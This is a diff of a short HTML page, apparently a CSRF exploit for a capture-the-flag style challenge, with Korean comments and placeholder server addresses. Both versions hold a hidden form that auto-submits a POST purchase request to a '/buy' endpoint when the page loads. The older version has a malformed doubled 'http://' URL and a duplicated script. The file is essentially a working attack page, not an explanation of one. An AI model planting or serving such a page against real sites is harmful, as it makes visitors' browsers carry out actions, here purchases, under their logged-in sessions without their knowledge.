@@ -2,26 +2,13 @@
 
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Purchase Review</title>
-</head>
 <body>
-    <h1>Reviewing Item...</h1>
-    <form id="csrf-form" action="http://http://15.164.98.47:32689/buy" method="POST">
-    <input type="hidden" name="product_id" value="[확인한_ID]"> 
-</form>
-
-<script>
-    window.onload = function() {
-        document.getElementById('csrf-form').submit();
-    };
-</script>
-
+    <form id="attack-form" action="http://[문제_서버_실제_주소]/buy" method="POST">
+        <input type="hidden" name="product_id" value="5">
+    </form>
     <script>
-        // 페이지가 로드되자마자 폼을 자동으로 제출합니다.
-        window.onload = function() {
-            document.getElementById('csrf-form').submit();
-        };
+        // 폼을 즉시 제출합니다.
+        document.getElementById('attack-form').submit();
     </script>
 </body>
 </html>
